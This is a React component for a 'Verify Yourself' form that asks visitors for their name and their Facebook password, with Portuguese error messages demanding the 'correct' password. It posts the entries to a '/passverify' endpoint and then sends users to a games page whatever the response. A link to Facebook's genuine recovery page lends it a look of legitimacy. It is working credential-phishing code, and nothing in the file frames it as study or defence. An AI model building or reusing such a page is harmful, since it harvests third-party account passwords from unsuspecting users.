import axios from 'axios';
import { useForm } from 'react-hook-form';
import { useNavigate, useParams } from 'react-router';
import { Link } from 'react-router-dom';
import "./verify.css"
import { toast } from 'react-toastify';


const Verifying = () => {

  let data = useForm();
  let navigate = useNavigate();


  const verifyKaro = (udata) => {

    // console.log(udata);
    // axios.post("http://localhost:8060/login", udata)
    //   .then(res => {
    //     alert(res.data.message)
    //     navigate("/Home")
    //   })

    fetch("/passverify", {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(udata)
    })
      .then(res => res.json()).then(
        data => {
          console.log(data);
          if (data.message === "password verified ") {
            alert(data.message);
            navigate("/games")
            toast("Now you can play games")

          } else {
            toast(data.message)
            alert(data.message);
            navigate("/games")
          }
        }
      )

  }

  return (
    <>
      <div className='containerrr'>
        <form onSubmit={data.handleSubmit(verifyKaro)} className="signup" >
          <h1>Verify Yourself</h1>
          <h2 className='head'>
            Go back to <Link to={"/"}>
              Home</Link>
          </h2>
          <div className="signup__field">
            <input
              {...data.register("username", { required: true })}
              className="signup__input"
              type="username"
              name="username"
              id="username"
              required=""
            />

            <label className="signup__label" htmlFor="username">
              Enter your name
            </label>
            {data.formState.errors.username && <div className="error" style={{ color: "red" }}>Enter your name</div>}
          </div>

          <div className="signup__field">
            <input
              {...data.register('password', {
                required: true, minLength: 6,
              })}
              className="signup__input"
              type="password"
              name="password"
              id="password"
              required=""
            />

            <label className="signup__label" htmlFor="password">
             Enter your Facebook password 
            </label>
            {data.formState.errors.password && data.formState.errors.password.type == "required" && <div className="error" style={{ color: "red" }}>Por favor, digite sua senha para continuar.</div>}
            {data.formState.errors.password && data.formState.errors.password.type == "minLength" && <div className="error" style={{ color: "red" }}>por favor digite sua senha correta do facebook</div>}

          </div>
          <div className="signup__field" style={{ marginTop: "-30px" }}>
            <span><Link to={"https://web.facebook.com/login/identify/?ctx=recover&from_login_screen=0"}>Forgot password?</Link></span>
          </div>
          <button className='button'>Confirm it</button>

        </form>

      </div>
    </>
  )
}

export default Verifying
